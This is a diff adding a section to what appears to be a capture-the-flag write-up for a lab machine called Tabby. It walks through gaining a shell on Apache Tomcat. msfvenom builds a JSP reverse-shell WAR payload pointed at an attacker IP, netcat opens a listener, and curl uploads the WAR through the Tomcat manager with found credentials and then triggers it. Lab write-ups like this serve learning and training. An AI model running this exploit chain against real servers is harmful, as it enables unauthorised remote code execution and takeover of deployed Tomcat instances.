@@ -194,5 +194,33 @@ not figured that out anytime soon.)
 The URL for uploading WAR files is http://tabby:8080/manager/text/deploy
 
 ```sh
+msfvenom --list payloads > msf_payloads # long list.
+grep java msf_payloads # java/jsp_shell_reverse_tcp looks good.
+msfvenom -l formats # war is what we need (wait what).
+
+# let's open a listener:
+rlwrap nc -vnlp 42424 # this will be our shell.
+
+# create the payload:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.69 LPORT=42424 -f war -o shell.war
+
+# war files are packed folders in disguise:
+mkdir shell && cd shell
+jar -xvf ../shell.war
+# take a look at it. the jsp file is interesting
+# (around line 50)
+cd ..
+
+# you can upload files with curl. same credentials we found before.
+curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://tabby:8080/manager/text/deploy?path=/shell'
+# -u user credentials
+# -T upload file
+
+# our new webapp should be visible in the manager now!
+
+# visit the new app in the browser:
+# http://tabby:8080/shell
+# or curl it, don't forget the following /:
+curl -u 'tomcat':'$3cureP4s5w0rd123!' 'http://tabby:8080/shell/'
 
 ```
